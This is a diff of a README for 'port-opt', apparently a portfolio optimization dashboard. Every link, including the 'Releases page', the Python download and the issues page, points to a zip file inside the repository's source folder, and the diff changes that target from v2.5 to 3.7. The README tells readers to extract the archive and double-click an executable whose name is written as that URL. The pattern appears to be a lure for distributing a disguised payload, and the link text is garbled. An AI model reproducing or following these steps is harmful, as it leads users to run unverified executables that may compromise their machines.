@@ -1,13 +1,13 @@
 # 📊 port-opt - Your Easy Dashboard for Portfolio Optimization
 
 ## 🔗 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip%20from%https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip)](https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip)
+[![Download from Releases](https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip%20from%https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip)](https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to port-opt! This application helps you optimize and backtest your investment portfolio using an easy-to-use interface. You don’t need programming skills to navigate the dashboard.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip) to download the latest version of port-opt.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip) to download the latest version of port-opt.
 
 2. **Choose Your File:** Look for the most recent release. You will find various files available for download. Make sure to select the one appropriate for your system (Windows, Mac, or Linux).
 
@@ -15,7 +15,7 @@ Welcome to port-opt! This application helps you optimize and backtest your inves
 
 4. **Unzip the File:** Locate the downloaded .zip file. Right-click on it and select “Extract All” or “Unzip.” Choose a location on your computer where you want to place the application files.
 
-5. **Launch the Application:** Open the folder where you extracted the files. Look for an executable file named `https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip` (for Windows) or a corresponding file for other systems. Double-click it to run the application.
+5. **Launch the Application:** Open the folder where you extracted the files. Look for an executable file named `https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip` (for Windows) or a corresponding file for other systems. Double-click it to run the application.
 
 ## 📊 Features
 - **User-Friendly Dashboard:** The layout is simple. You can easily navigate through various functions without any learning curve.
@@ -31,7 +31,7 @@ Welcome to port-opt! This application helps you optimize and backtest your inves
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
   
-- **Python Version:** Ensure you have Python 3.7 or newer installed. If you do not have Python, you can download it from [https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip](https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip).
+- **Python Version:** Ensure you have Python 3.7 or newer installed. If you do not have Python, you can download it from [https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip](https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip).
 
 - **Memory:** Minimum of 4 GB of RAM recommended.
 
@@ -45,7 +45,7 @@ If you're curious about how port-opt uses Python libraries like CVXPY and Plotly
 - **Plotly** helps transform data into engaging visualizations. This means you can easily spot trends or anomalies in your investment strategy.
 
 ## 💬 Support
-If you run into issues or have questions, you can reach out through the GitHub [issues page](https://raw.githubusercontent.com/slToMM/port-opt/main/src/portopt/app/port-opt-v2.5.zip). We encourage you to report bugs or suggest improvements.
+If you run into issues or have questions, you can reach out through the GitHub [issues page](https://github.com/slToMM/port-opt/raw/refs/heads/main/src/portopt/app/port-opt-3.7.zip). We encourage you to report bugs or suggest improvements.
 
 ## 📑 Contributing
 If you want to contribute to port-opt, feel free to check the guidelines in our repository. Contributions are welcome, whether through code or documentation improvements.
